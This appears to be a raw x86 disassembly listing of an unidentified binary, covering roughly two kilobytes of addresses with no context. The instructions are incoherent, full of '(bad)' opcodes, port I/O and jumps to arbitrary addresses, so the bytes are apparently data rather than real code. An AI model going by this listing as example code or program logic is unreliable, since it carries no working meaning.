  41999c:	add    ebp,DWORD PTR [edi+ebx*8-0x3a8e927a]
  4199a3:	dec    edi
  4199a4:	push   es
  4199a5:	or     al,0x60
  4199a7:	mov    ebx,0xdd56b2eb
  4199ac:	loopne 0x41995a
  4199ae:	addr16 pusha 
  4199b0:	scas   eax,DWORD PTR es:[edi]
  4199b1:	test   DWORD PTR [edx],ebp
  4199b3:	push   0xffffffde
  4199b5:	fstp   TBYTE PTR [edi+eiz*1-0x396ab287]
  4199bc:	mov    dl,0x35
  4199be:	xchg   DWORD PTR [ebx+eax*8-0x1e],edx
  4199c2:	in     al,dx
  4199c3:	cmp    edx,DWORD PTR [esi-0x2]
  4199c6:	test   BYTE PTR [esi+ebp*2-0x59bca2b6],dl
  4199cd:	mov    al,ds:0x4c5da39e
  4199d2:	jnp    0x4199f7
  4199d4:	data16 test al,0xac
  4199d7:	adc    DWORD PTR [eax],0xa64fb3c3
  4199dd:	js     0x41998b
  4199df:	repnz das 
  4199e1:	cmp    eax,0x49808bde
  4199e6:	imul   esi,DWORD PTR [eax+edx*2+0x47],0xdbe1bc76
  4199ee:	mov    eax,0xcca6a55b
  4199f3:	out    dx,al
  4199f4:	inc    edx
  4199f5:	adc    edi,ecx
  4199f7:	adc    ah,BYTE PTR [edx+0x5418e881]
  4199fd:	mov    DWORD PTR [ebx],ecx
  4199ff:	mov    WORD PTR [ebp-0x711de0eb],es
  419a05:	xchg   edx,eax
  419a06:	push   ss
  419a07:	push   0x47d4c77c
  419a0c:	xchg   esp,eax
  419a0d:	mov    edi,0x6d26f4b2
  419a12:	or     DWORD PTR [ebx],eax
  419a14:	mov    ah,BYTE PTR [edi+edi*4-0x2988ffe3]
  419a1b:	mov    edi,0x15b08427
  419a20:	mov    esi,0xb883dd57
  419a25:	aas    
  419a26:	mov    dh,0x73
  419a28:	dec    ebx
  419a29:	jb     0x419a77
  419a2b:	sbb    al,dl
  419a2d:	jg     0x419a28
  419a2f:	mov    al,0xbc
  419a31:	push   esp
  419a32:	imul   edx,esp,0xcf3b4c87
  419a38:	ret    0xc884
  419a3b:	pop    esi
  419a3c:	mov    bl,0x15
  419a3e:	xchg   ecx,eax
  419a3f:	cwde   
  419a40:	add    cl,BYTE PTR [edi-0x2ed1a49]
  419a46:	outs   dx,BYTE PTR ds:[esi]
  419a47:	add    ebx,DWORD PTR [edx-0x59]
  419a4a:	mov    dh,0x6c
  419a4c:	jo     0x419a37
  419a4e:	push   ecx
  419a4f:	gs mov dh,0x4b
  419a52:	push   ds
  419a53:	pop    ecx
  419a54:	in     eax,0x6c
  419a56:	add    eax,0x44e980e5
  419a5b:	mov    ecx,0x8d422fde
  419a60:	(bad)  [edx]
  419a62:	pop    esp
  419a63:	mov    eax,ds:0xbb18f0e
  419a68:	xchg   esi,eax
  419a69:	repnz or BYTE PTR [ebx+0x44],dl
  419a6d:	into   
  419a6e:	sbb    al,BYTE PTR [ebx+0x6a]
  419a71:	jbe    0x419aa7
  419a73:	iret   
  419a74:	adc    al,0xc4
  419a76:	lds    ecx,FWORD PTR [edx+0x9]
  419a79:	add    cl,BYTE PTR [edx]
  419a7b:	gs dec ebp
  419a7d:	xchg   esi,eax
  419a7e:	lds    ecx,FWORD PTR [esi+0x264dfdcf]
  419a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a85:	out    0x2b,al
  419a87:	popa   
  419a88:	cs jno 0x419a12
  419a8b:	inc    esi
  419a8c:	sbb    al,0xf7
  419a8e:	stc    
  419a8f:	fiadd  DWORD PTR [ebx-0x6a]
  419a92:	jmp    0x419b09
  419a94:	rcr    esi,cl
  419a96:	std    
  419a97:	push   ds
  419a98:	call   0xdd4a5ce0
  419a9d:	movd   DWORD PTR [ebp+0xcbf4464],mm3
  419aa4:	and    DWORD PTR [esi-0x49a93f01],edi
  419aaa:	adc    BYTE PTR [ebx-0x38d56110],cl
  419ab0:	stc    
  419ab1:	adc    ebp,DWORD PTR [edx-0x41732e]
  419ab7:	cmp    ah,BYTE PTR [ecx*1+0xcb52a4d]
  419abe:	loopne 0x419ac8
  419ac0:	ret    
  419ac1:	mov    dl,0x96
  419ac3:	mov    eax,0x20672953
  419ac8:	out    dx,al
  419ac9:	iret   
  419aca:	xchg   ebp,eax
  419acb:	fcomp  QWORD PTR ds:0x81b6c4c6
  419ad1:	dec    esi
  419ad3:	shl    bl,0x3b
  419ad6:	fdivr  QWORD PTR [eax+0x11]
  419ad9:	test   al,0xfa
  419adb:	push   eax
  419adc:	pop    es
  419add:	cmp    DWORD PTR [edx-0x247eda89],eax
  419ae3:	popf   
  419ae4:	sar    BYTE PTR [esi+0xaaa612],0x72
  419aeb:	adc    DWORD PTR [esi-0x7852d798],eax
  419af1:	add    ecx,DWORD PTR ds:0xd3d59b0a
  419af7:	fld    st(6)
  419af9:	out    0xa8,al
  419afb:	adc    BYTE PTR [ebx+0x3ee9135e],dh
  419b01:	add    DWORD PTR [edx-0x48],ecx
  419b04:	sbb    DWORD PTR [ecx-0x1d999992],ebp
  419b0a:	fidiv  DWORD PTR [esp+ebp*1+0x27744479]
  419b12:	or     al,0x6e
  419b14:	sbb    al,0x41
  419b16:	xlat   BYTE PTR ds:[ebx]
  419b17:	xchg   ecx,eax
  419b18:	popa   
  419b19:	popa   
  419b1a:	sbb    BYTE PTR [ebx+0x78],ah
  419b1d:	pop    ebp
  419b1e:	mov    ah,0x85
  419b20:	pop    ebp
  419b21:	outs   dx,DWORD PTR ds:[esi]
  419b22:	call   0x4788:0x178e4a86
  419b29:	mov    ecx,0x64e8c2b5
  419b2e:	call   0xaf80:0xe86250c2
  419b35:	push   eax
  419b36:	es enter 0x1cc9,0xd
  419b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b3c:	jb     0x419b78
  419b3e:	xchg   esp,eax
  419b3f:	lods   eax,DWORD PTR ds:[esi]
  419b40:	pushf  
  419b41:	sti    
  419b42:	dec    ebp
  419b43:	bsf    edx,DWORD PTR [ecx-0x61a15e69]
  419b4a:	sbb    eax,DWORD PTR ds:0xf2ec95bd
  419b50:	mov    ds:0xa25203fc,al
  419b55:	xchg   edi,eax
  419b56:	mov    WORD PTR [edx],gs
  419b58:	xor    ch,BYTE PTR [esi]
  419b5a:	das    
  419b5b:	jne    0x419b7c
  419b5d:	jbe    0x419b9c
  419b5f:	and    eax,0xbc1c5d49
  419b64:	jle    0x419b91
  419b66:	std    
  419b67:	shr    BYTE PTR [edi+0x1c],cl
  419b6a:	aas    
  419b6b:	sti    
  419b6c:	lds    ecx,FWORD PTR ds:0x4cd419df
  419b72:	stos   DWORD PTR es:[edi],eax
  419b73:	cmp    eax,0x61c8e652
  419b78:	jmp    0xce1202fe
  419b7d:	mov    edi,0x29dd5228
  419b82:	jmp    0x9567:0x7eef7ca0
  419b89:	stos   BYTE PTR es:[edi],al
  419b8a:	out    0x56,al
  419b8c:	int3   
  419b8d:	cmp    DWORD PTR [esi+eiz*2-0x74],ebp
  419b91:	jnp    0x419bbd
  419b93:	aas    
  419b94:	mov    si,0x11c8
  419b98:	xchg   esi,eax
  419b99:	stc    
  419b9a:	jmp    0x419bae
  419b9c:	(bad)  
  419b9d:	pop    esi
  419b9e:	pop    es
  419b9f:	(bad)  
  419ba0:	lahf   
  419ba1:	sbb    eax,0x6f6d007d
  419ba6:	jne    0x419be0
  419ba8:	rcl    DWORD PTR [eax+eiz*2-0x4bc34323],0xaa
  419bb0:	mov    WORD PTR [ebp-0x514a3dfe],gs
  419bb6:	aad    0x19
  419bb8:	cmp    bh,al
  419bba:	mov    ds:0xc58fdb2d,eax
  419bbf:	push   eax
  419bc0:	xchg   ebp,eax
  419bc1:	inc    ebx
  419bc2:	push   esp
  419bc3:	xchg   edi,eax
  419bc4:	mov    ds:0x177e9887,al
  419bc9:	pop    ss
  419bca:	jle    0x419bcf
  419bcc:	pop    eax
  419bcd:	stos   BYTE PTR es:[edi],al
  419bce:	mov    esp,0xda777f48
  419bd3:	mov    ds:0xecf8d8c7,eax
  419bd8:	jb     0x419b7b
  419bda:	or     eax,edi
  419bdc:	sub    ch,dh
  419bde:	(bad)  
  419bdf:	pop    edi
  419be0:	adc    ecx,eax
  419be2:	inc    edx
  419be3:	pop    ss
  419be4:	xchg   esi,eax
  419be5:	mov    dl,0xcd
  419be7:	ins    DWORD PTR es:[edi],dx
  419be8:	je     0x419bea
  419bea:	push   0x3b
  419bec:	adc    ecx,DWORD PTR [edx+0xebce034]
  419bf2:	xor    eax,0x121740df
  419bf7:	je     0x419c6d
  419bf9:	xor    ebp,DWORD PTR [edi-0x37]
  419bfc:	jg     0x419c3f
  419bfe:	fs (bad) 
  419c00:	cmp    dl,BYTE PTR [ebx]
  419c02:	in     eax,0x90
  419c04:	inc    ebx
  419c05:	mov    eax,ds:0xc3e2905c
  419c0a:	mov    al,ds:0xacb62744
  419c0f:	scas   al,BYTE PTR es:[edi]
  419c10:	jb     0x419ba6
  419c12:	ss out dx,al
  419c14:	push   0xffffff86
  419c16:	push   esi
  419c17:	faddp  st(3),st
  419c19:	dec    ebp
  419c1a:	test   al,0x62
  419c1c:	mov    edi,0x46145d97
  419c21:	out    0xb9,al
  419c23:	sar    bh,cl
  419c25:	mov    edi,0x54a17e19
  419c2a:	adc    BYTE PTR [esi-0x2b3993af],cl
  419c30:	loop   0x419c85
  419c32:	pop    ds
  419c33:	add    al,0xb3
  419c35:	and    DWORD PTR [edi],eax
  419c37:	int3   
  419c38:	jmp    esp
  419c3a:	adc    al,0x16
  419c3c:	jae    0x419c65
  419c3e:	(bad)  
  419c3f:	sbb    ah,dl
  419c41:	push   ds
  419c42:	dec    eax
  419c43:	mov    edx,0x81f71761
  419c48:	mov    ?,esi
  419c4a:	clc    
  419c4b:	pop    es
  419c4c:	pop    edi
  419c4d:	(bad)  
  419c4e:	fs sbb al,0xae
  419c51:	aas    
  419c52:	in     eax,0xdd
  419c54:	inc    esi
  419c55:	dec    esp
  419c56:	addr16 cs loopne 0x419beb
  419c5a:	mov    ch,0x93
  419c5c:	lock xchg BYTE PTR [ebx+ebp*1-0x163a07ac],ch
  419c64:	ins    DWORD PTR es:[edi],dx
  419c65:	cli    
  419c66:	in     al,0x4b
  419c68:	cwde   
  419c69:	push   edi
  419c6a:	mov    ebx,0xdb13602a
  419c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c70:	je     0x419c2f
  419c72:	hlt    
  419c73:	push   edi
  419c74:	into   
  419c75:	jne    0x419c72
  419c77:	sahf   
  419c78:	shl    BYTE PTR [ebx+ebp*8+0x41],cl
  419c7c:	repnz mov al,0xef
  419c7f:	mov    ebx,0xfe819327
  419c84:	ja     0x419cbd
  419c86:	shl    DWORD PTR [eax],0xcc
  419c89:	fidiv  DWORD PTR ds:0x7b606f31
  419c8f:	pop    ds
  419c90:	stc    
  419c91:	stc    
  419c92:	pop    esp
  419c93:	pop    ss
  419c94:	sub    al,0x45
  419c96:	xor    BYTE PTR [esi-0x4d],0x46
  419c9a:	hlt    
  419c9b:	jl     0x419c97
  419c9d:	cmp    DWORD PTR [ebp+0x41efbb37],esp
  419ca3:	icebp  
  419ca4:	sub    DWORD PTR [esi-0x1280a119],edi
  419caa:	fs fwait
  419cac:	repz add edi,ebx
  419caf:	std    
  419cb0:	fidivr DWORD PTR [esi]
  419cb2:	(bad)  
  419cb4:	push   0x74ec2096
  419cb9:	inc    esp
  419cba:	fdiv   st,st(6)
  419cbc:	dec    esp
  419cbe:	push   ds
  419cbf:	push   cs
  419cc0:	inc    eax
  419cc1:	dec    esp
  419cc2:	cmp    al,0x6f
  419cc4:	jne    0x419ca6
  419cc6:	loope  0x419c98
  419cc8:	and    dh,bh
  419cca:	add    al,0xda
  419ccc:	ret    
  419ccd:	inc    ebp
  419cce:	and    eax,0x52c65f64
  419cd3:	push   esp
  419cd4:	in     al,dx
  419cd5:	inc    edx
  419cd6:	fidiv  WORD PTR [edi-0x3]
  419cd9:	xchg   edx,eax
  419cdb:	xchg   BYTE PTR [ecx],bh
  419cdd:	mov    ebx,0x32252d90
  419ce2:	scas   al,BYTE PTR es:[edi]
  419ce3:	in     eax,dx
  419ce4:	sbb    al,0x66
  419ce6:	jmp    0xca774a58
  419ceb:	and    DWORD PTR [edx-0x21e8afb1],esp
  419cf1:	jge    0x419d0e
  419cf3:	add    BYTE PTR [si],0x32
  419cf7:	fst    DWORD PTR [ecx+0x394ea030]
  419cfd:	mov    bl,0x1d
  419cff:	jb     0x419d66
  419d01:	mov    WORD PTR [esi],?
  419d03:	lods   eax,DWORD PTR ds:[esi]
  419d04:	sub    BYTE PTR [eax],ah
  419d06:	daa    
  419d07:	sti    
  419d08:	fld    TBYTE PTR [ebx-0x76bf4b10]
  419d0e:	and    DWORD PTR [ebp-0x196ef319],eax
  419d14:	and    eax,0x31194fe4
  419d19:	sub    eax,0x346c7d43
  419d1e:	mov    ah,ch
  419d20:	sbb    ch,0x45
  419d23:	out    0x40,al
  419d25:	dec    edi
  419d26:	sub    esi,0x5
  419d29:	lea    ebx,[eax+0x5b548081]
  419d2f:	mov    ch,dl
  419d31:	cdq    
  419d32:	jle    0x419d1f
  419d34:	xor    DWORD PTR [esi],0x58a221a4
  419d3a:	adc    DWORD PTR [edi-0x37],eax
  419d3d:	test   al,0x61
  419d3f:	or     al,0xd7
  419d41:	xor    al,0x3c
  419d43:	fstp   TBYTE PTR [edx]
  419d45:	inc    esi
  419d46:	cmp    BYTE PTR [ebp+0x43],cl
  419d49:	loopne 0x419d8d
  419d4b:	or     ah,BYTE PTR [edi+eiz*1+0x1b253cd7]
  419d52:	jge    0x419d0f
  419d54:	sub    BYTE PTR [eax+0x74],dh
  419d57:	lock xchg esp,eax
  419d59:	retf   0x5d8d
  419d5c:	cmp    esi,DWORD PTR [edx+ecx*4+0x28]
  419d60:	pop    eax
  419d61:	jae    0x419d78
  419d63:	or     eax,0xbb97c92a
  419d68:	cmp    al,0xa0
  419d6a:	xchg   ecx,eax
  419d6b:	loop   0x419d87
  419d6d:	(bad)  [ecx+0x1ab65e33]
  419d73:	popf   
  419d74:	ins    DWORD PTR es:[edi],dx
  419d75:	call   0x3b0b:0xb3416659
  419d7c:	or     bl,BYTE PTR [ebx]
  419d7e:	retf   0xd9aa
  419d81:	(bad)  
  419d82:	fadd   DWORD PTR [edi]
  419d84:	mov    al,0xd2
  419d86:	or     al,0x23
  419d88:	sub    BYTE PTR [edx-0x24],al
  419d8b:	mov    ds:0x98a84ffc,eax
  419d90:	imul   ebp,DWORD PTR [edi+0x33],0x33
  419d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d95:	jns    0x419d43
  419d97:	shr    ecx,1
  419d99:	dec    esi
  419d9a:	or     eax,0x9cd92041
  419d9f:	fwait
  419da0:	pop    esp
  419da1:	test   ebp,ebp
  419da3:	repz cmp BYTE PTR [ebx+0x9],0x34
  419da8:	or     al,BYTE PTR [eax+0x5faa7b94]
  419dae:	fld    QWORD PTR [edx+edi*8]
  419db1:	push   ecx
  419db2:	fidivr DWORD PTR [eax+0x4b]
  419db5:	cli    
  419db6:	cmp    DWORD PTR [edx+ebx*8],0xfffffff7
  419dba:	inc    ecx
  419dbb:	retf   0xecb8
  419dbe:	outs   dx,BYTE PTR ds:[esi]
  419dbf:	or     ebp,DWORD PTR [edx+0x36aa6152]
  419dc5:	and    ebp,edi
  419dc7:	sub    bl,BYTE PTR cs:[edx]
  419dca:	aaa    
  419dcb:	sbb    DWORD PTR [ecx+edi*1],esp
  419dce:	repnz sbb DWORD PTR [ebx+0x68],ecx
  419dd2:	mov    bh,0x14
  419dd4:	sbb    BYTE PTR [edx+0x5b],0xa8
  419dd8:	jbe    0x419e4c
  419dda:	mul    DWORD PTR [esp+eax*2+0x59]
  419dde:	imul   eax,DWORD PTR [esi-0x7cbfe265],0xfd7e39d4
  419de8:	jae    0x419dd6
  419dea:	xor    DWORD PTR [esi+0x21],edx
  419ded:	add    BYTE PTR [edx+ebp*2],0xb7
  419df1:	mov    edi,0x2d734043
  419df6:	xchg   ebx,eax
  419df7:	mov    edi,0xacfff848
  419dfc:	imul   edi,DWORD PTR [eax-0x627fb812],0xa7d149de
  419e06:	mov    ecx,0xc6e07860
  419e0b:	adc    al,0x93
  419e0d:	int3   
  419e0e:	test   al,0x7e
  419e10:	lahf   
  419e11:	or     eax,ebx
  419e13:	aaa    
  419e14:	neg    ch
  419e16:	sbb    DWORD PTR [edx],0x3b39582c
  419e1c:	and    DWORD PTR [ebx+edx*4+0x1a],eax
  419e20:	add    ah,BYTE PTR [edx-0x20d4f6b5]
  419e26:	in     eax,dx
  419e27:	jo     0x419df9
  419e29:	pop    eax
  419e2a:	mov    dh,0xd3
  419e2c:	lods   eax,DWORD PTR ds:[esi]
  419e2d:	cmp    DWORD PTR [edi+0xb075409],ebx
  419e33:	mov    al,ds:0xb09fb405
  419e38:	sbb    DWORD PTR [edi],eax
  419e3a:	cs pop ecx
  419e3c:	cmp    eax,0x29f2dc02
  419e41:	shl    BYTE PTR [ebp+0xd],1
  419e44:	pop    edi
  419e45:	mov    cl,0x9c
  419e47:	in     eax,dx
  419e48:	or     dh,BYTE PTR [edx-0x2865b833]
  419e4e:	push   eax
  419e4f:	cmp    ecx,DWORD PTR [ebx-0x42]
  419e52:	in     eax,0x4d
  419e54:	aas    
  419e55:	ds clc 
  419e57:	test   al,0x10
  419e59:	ret    0x399
  419e5c:	repz pop esp
  419e5e:	push   ebp
  419e5f:	addr16 push edi
  419e61:	aaa    
  419e62:	rcl    DWORD PTR [esi+0x9],cl
  419e65:	inc    ebp
  419e66:	sub    dh,ch
  419e68:	add    DWORD PTR [eax+0x55],ecx
  419e6b:	repz mov al,ds:0x7a1dccf6
  419e71:	mov    DWORD PTR ds:0x6f74af44,eax
  419e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e78:	mov    ds:0xca56523d,eax
  419e7d:	mov    bh,0x8
  419e7f:	dec    ecx
  419e80:	sti    
  419e81:	sub    al,BYTE PTR [ebx+0x2a5d0741]
  419e87:	inc    ebp
  419e88:	push   ecx
  419e89:	retf   
  419e8a:	in     al,dx
  419e8b:	adc    DWORD PTR [edi+0x283cf204],ebx
  419e91:	lds    ebp,FWORD PTR [eax+ebp*4-0x64]
  419e95:	int3   
  419e96:	jg     0x419e4a
  419e98:	imul   ebp,DWORD PTR [esp+eiz*8+0xb],0xb610be7f
  419ea0:	div    DWORD PTR [ecx+0x10]
  419ea3:	dec    edx
  419ea4:	dec    ebp
  419ea5:	mov    cl,0x14
  419ea7:	xchg   ebp,eax
  419ea8:	xlat   BYTE PTR ds:[ebx]
  419ea9:	inc    ebx
  419eaa:	aad    0x7a
  419eac:	loope  0x419ef0
  419eae:	scas   al,BYTE PTR es:[edi]
  419eaf:	leave  
  419eb0:	push   esi
  419eb1:	imul   esi,DWORD PTR [ebx],0xffffffca
  419eb4:	je     0x419f05
  419eb6:	fs pop esp
  419eb8:	sahf   
  419eb9:	jb     0x419e42
  419ebb:	mov    esp,0xc3f25dd6
  419ec0:	mov    cl,cl
  419ec2:	out    0xae,al
  419ec4:	dec    esi
  419ec5:	nop
  419ec6:	and    bh,BYTE PTR [ebx+esi*4-0x21]
  419eca:	xchg   ecx,eax
  419ecb:	jecxz  0x419e7b
  419ecd:	outs   dx,DWORD PTR ds:[esi]
  419ece:	jmp    0xa7c913d8
  419ed3:	(bad)  
  419ed4:	aam    0x40
  419ed6:	mov    ds:0x4d50cc2e,al
  419edb:	imul   esi,DWORD PTR [ecx-0x5e],0xeffc58b6
  419ee2:	pop    esp
  419ee3:	xchg   edi,eax
  419ee4:	gs dec bp
  419ee7:	je     0x419ee9
  419ee9:	jae    0x419f19
  419eeb:	aaa    
  419eec:	jl     0x419f65
  419eee:	cmp    al,0x7e
  419ef0:	pop    ss
  419ef1:	jl     0x419f63
  419ef3:	xor    ah,ah
  419ef5:	out    dx,al
  419ef6:	lock rcl DWORD PTR [edi-0x8],1
  419efa:	fwait
  419efb:	push   0xffffffbb
  419efd:	pop    es
  419efe:	jge    0x419f2d
  419f00:	sub    al,0xe6
  419f02:	jnp    0x419f2f
  419f04:	mov    eax,ds:0x6d53a539
  419f09:	mov    ebp,0x5be58f3b
  419f0e:	pop    edi
  419f0f:	retf   
  419f10:	xor    DWORD PTR [ecx-0x63bf0ef],ebx
  419f16:	ret    
  419f17:	sbb    DWORD PTR [esp+ebx*2],esp
  419f1a:	mov    esp,ecx
  419f1c:	shr    DWORD PTR [eax+0x22],1
  419f1f:	fsubr  DWORD PTR [eax+0x7b1c4e09]
  419f25:	jmp    0x419f46
  419f27:	stc    
  419f28:	dec    ebp
  419f29:	or     ebp,eax
  419f2b:	ds cmp eax,0x7a4c683
  419f31:	push   es
  419f32:	inc    ecx
  419f33:	aaa    
  419f34:	push   ds
  419f35:	hlt    
  419f36:	push   es
  419f37:	mov    al,0x21
  419f39:	in     eax,dx
  419f3a:	das    
  419f3b:	iret   
  419f3c:	mov    eax,ds:0x6757d610
  419f41:	fild   WORD PTR [esp+edx*8+0x25]
  419f45:	add    edi,DWORD PTR [edi]
  419f47:	les    ebx,FWORD PTR [ecx+0x44]
  419f4a:	dec    ebx
  419f4b:	mov    dh,0x97
  419f4d:	enter  0x2c6e,0x2a
  419f51:	stos   BYTE PTR es:[edi],al
  419f52:	push   ds
  419f53:	adc    edx,DWORD PTR [eax+ebx*1-0x2f]
  419f57:	ds sbb ebp,ebx
  419f5a:	test   al,0xc8
  419f5c:	(bad)  
  419f5e:	in     al,dx
  419f5f:	repnz cmp BYTE PTR [esp+esi*8-0x73156],bh
  419f67:	test   al,0xd9
  419f69:	iret   
  419f6a:	sahf   
  419f6b:	push   cs
  419f6c:	add    al,0xec
  419f6e:	jg     0x419f76
  419f70:	push   ecx
  419f71:	mov    edi,0x54d10e02
  419f76:	data16 and al,0xd9
  419f79:	push   ds
  419f7a:	out    dx,al
  419f7b:	and    BYTE PTR [ecx+eax*4-0x20],dl
  419f7f:	fstp   DWORD PTR [ecx]
  419f81:	dec    esp
  419f82:	mov    edx,0xffc73277
  419f87:	retf   0x1bd6
  419f8a:	out    dx,al
  419f8b:	fnstcw WORD PTR ds:0x40aedf43
  419f91:	sub    ebp,esi
  419f93:	adc    eax,0xbaeaae25
  419f98:	jg     0x419f6f
  419f9a:	and    eax,0xd11f7cda
  419f9f:	or     eax,0x2ab2b647
  419fa4:	adc    dl,BYTE PTR [edi]
  419fa6:	push   0xffffffc1
  419fa8:	inc    ebp
  419fa9:	xchg   dh,bl
  419fab:	in     eax,dx
  419fac:	xor    eax,0x1d473b98
  419fb1:	outs   dx,BYTE PTR ds:[esi]
  419fb2:	dec    ecx
  419fb3:	pop    ss
  419fb4:	test   al,0x49
  419fb6:	dec    esi
  419fb7:	add    DWORD PTR [edi+edi*2-0x5391b817],eax
  419fbe:	ss xor bh,al
  419fc1:	pop    ebp
  419fc2:	pop    es
  419fc3:	xchg   DWORD PTR [ecx],ecx
  419fc5:	mov    ah,cl
  419fc7:	(bad)  
  419fc8:	adc    DWORD PTR [ebp+ebp*1+0x1c],eax
  419fcc:	int    0x75
  419fce:	lds    ebp,FWORD PTR [ebp-0x14]
  419fd1:	mov    al,0xe0
  419fd3:	adc    esp,esi
  419fd5:	fs push ss
  419fd7:	(bad)  
  419fd8:	shl    ebx,0xcf
  419fdb:	lods   eax,DWORD PTR ds:[esi]
  419fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fdd:	mov    dh,0x69
  419fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fe0:	stos   DWORD PTR es:[edi],eax
  419fe1:	fs dec ebp
  419fe3:	add    dl,0xef
  419fe6:	xchg   ebx,eax
  419fe7:	mov    ah,0x4b
  419fe9:	in     al,0x5d
  419feb:	pop    ebp
  419fec:	retf   0x45e1
  419fef:	lahf   
  419ff0:	jae    0x419f9d
  419ff2:	and    DWORD PTR [edi+0x1d527dce],edx
  419ff8:	add    DWORD PTR [ecx+0x72],ebx
  419ffb:	jg     0x41a005
  419ffd:	pop    ss
  419ffe:	nop
  419fff:	out    dx,al
  41a000:	xchg   esi,eax
  41a001:	mov    DWORD PTR [edx+0x16],ebx
  41a004:	out    0x25,eax
  41a006:	cmp    al,0x93
  41a008:	iret   
  41a009:	out    0x3c,al
  41a00b:	scas   al,BYTE PTR es:[edi]
  41a00c:	loopne 0x419f98
  41a00e:	mov    dl,0xc4
  41a010:	retf   0x2016
  41a013:	ret    
  41a014:	sar    dl,0xe5
  41a017:	in     eax,dx
  41a018:	mov    al,ch
  41a01a:	fcomp  QWORD PTR [ecx+0x52089cbb]
  41a020:	lock mov ebx,0x97ce9ee3
  41a026:	stos   BYTE PTR es:[edi],al
  41a027:	add    al,0xec
  41a029:	stos   DWORD PTR es:[edi],eax
  41a02a:	repnz xchg ecx,eax
  41a02c:	sti    
  41a02d:	aad    0x6d
  41a02f:	add    DWORD PTR ds:0x32e89c2c,esp
  41a035:	sub    BYTE PTR [edi-0x65a250b5],ch
  41a03b:	jmp    0x9c27d28f
  41a040:	sbb    DWORD PTR [edx+0x0],eax
  41a043:	jl     0x41a01e
  41a045:	push   0x44ce3f80
  41a04a:	push   edx
  41a04b:	sahf   
  41a04c:	or     al,0x66
  41a04e:	mov    ah,0x71
  41a050:	pop    ecx
  41a051:	pop    edi
  41a052:	sub    edi,DWORD PTR [ebp-0x1cf7a3da]
  41a058:	or     ecx,edx
  41a05a:	jp     0x41a01c
  41a05c:	mov    ebx,0x432fd58d
  41a061:	and    BYTE PTR [eax-0x5d],0x0
  41a065:	call   0xad2b4585
  41a06a:	outs   dx,BYTE PTR ds:[esi]
  41a06b:	rcr    DWORD PTR [edx-0x2cace8a8],1
  41a071:	call   0x8497:0x9ec1913d
  41a078:	inc    esi
  41a079:	sbb    eax,DWORD PTR [edx+0x1c]
  41a07c:	adc    BYTE PTR [ecx+0x36],0xad
  41a080:	pcmpgtw mm4,QWORD PTR [eax]
  41a083:	cmp    BYTE PTR [ecx-0x5c],bh
  41a086:	retf   0x26a4
  41a089:	and    bh,BYTE PTR [esi]
  41a08b:	test   BYTE PTR [edx],dl
  41a08d:	ins    DWORD PTR es:[edi],dx
  41a08e:	movaps XMMWORD PTR [ecx+edi*2-0xd],xmm0
  41a093:	iret   
  41a094:	fwait
  41a095:	mov    al,0xf4
  41a097:	(bad)  
  41a099:	(bad)  
  41a09a:	jbe    0x41a100
  41a09c:	mov    eax,esp
  41a09e:	ins    BYTE PTR es:[edi],dx
  41a09f:	mov    ah,0x86
  41a0a1:	push   edx
  41a0a2:	xor    eax,DWORD PTR [eax-0x574d0ee0]
  41a0a8:	mov    DWORD PTR [ecx-0x6acf3847],edx
  41a0ae:	jl     0x41a114
  41a0b0:	or     edx,ebx
  41a0b2:	pop    ecx
  41a0b3:	cli    
  41a0b4:	pop    ebx
  41a0b5:	jae    0x41a131
  41a0b7:	pop    ebx
  41a0b8:	or     al,0xdc
  41a0ba:	mov    esp,0x33eae75d
  41a0bf:	or     DWORD PTR es:[esi],esp
  41a0c2:	mov    esi,0x83b36fb6
  41a0c7:	retf   0xfbff
  41a0ca:	pusha  
  41a0cb:	jp     0x41a0e0
  41a0cd:	into   
  41a0ce:	push   ss
  41a0cf:	(bad)  
  41a0d0:	imul   esp,ebp,0xffffffe6
  41a0d3:	(bad)  
  41a0d4:	ds cmp ebp,esp
  41a0d7:	jle    0x41a08d
  41a0d9:	and    BYTE PTR [eax-0x52d6b3c6],cl
  41a0df:	sub    al,0xc9
  41a0e1:	and    edx,DWORD PTR [ecx-0x4fb8af41]
  41a0e7:	pop    eax
  41a0e8:	or     BYTE PTR [esi],ah
  41a0ea:	mov    esi,0xc45b4e1e
  41a0ef:	xchg   ecx,eax
  41a0f0:	and    eax,0x4e44a23c
  41a0f5:	outs   dx,BYTE PTR ds:[esi]
  41a0f6:	mov    edi,0x43cfb53f
  41a0fb:	lock dec edx
  41a0fd:	pop    ss
  41a0fe:	sub    DWORD PTR [ecx+0x16939b60],0xbdb27063
  41a108:	pop    ss
  41a109:	lea    ecx,[ecx-0x58f72da2]
  41a10f:	enter  0x7d40,0x28
  41a113:	arpl   WORD PTR [ebx-0x72],si
  41a116:	iret   
  41a117:	cmp    eax,0x79946766
  41a11c:	jne    0x41a160
  41a11e:	inc    edi
  41a11f:	shl    BYTE PTR [ebp+0x10142918],cl
  41a125:	pop    edi
  41a126:	mov    ?,WORD PTR [esp+ebx*8]
  41a129:	mov    dl,0xa
  41a12b:	lods   al,BYTE PTR ds:[esi]
  41a12c:	ins    BYTE PTR es:[edi],dx
  41a12d:	(bad)  
  41a12e:	jle    0x41a14c
  41a130:	pop    es
  41a131:	(bad)  
  41a132:	mov    DWORD PTR [edi-0x37698c12],ecx
  41a138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a139:	test   DWORD PTR [eax+0x62],ecx
  41a13c:	mov    ebx,0x67c8df66
  41a141:	pop    ds
  41a142:	aas    
  41a143:	or     BYTE PTR [esp+esi*1+0x46878eef],bl
  41a14a:	ror    DWORD PTR [ecx-0x7f],0x56
  41a14e:	dec    edi
  41a14f:	jns    0x41a1b5
  41a151:	scas   eax,DWORD PTR es:[edi]
  41a152:	jns    0x41a0de
  41a154:	imul   edx,eax,0x7
  41a157:	(bad)  
  41a158:	jl     0x41a17d
  41a15a:	or     DWORD PTR [edx],edx
  41a15c:	(bad)  
  41a15d:	hlt    
  41a15e:	add    DWORD PTR [edi],ebp
  41a160:	adc    BYTE PTR [eax-0x27],0xcb
  41a164:	mov    eax,ds:0xa6b9a970
  41a169:	jbe    0x41a106
  41a16b:	repnz es pop esp
  41a16e:	cmc    
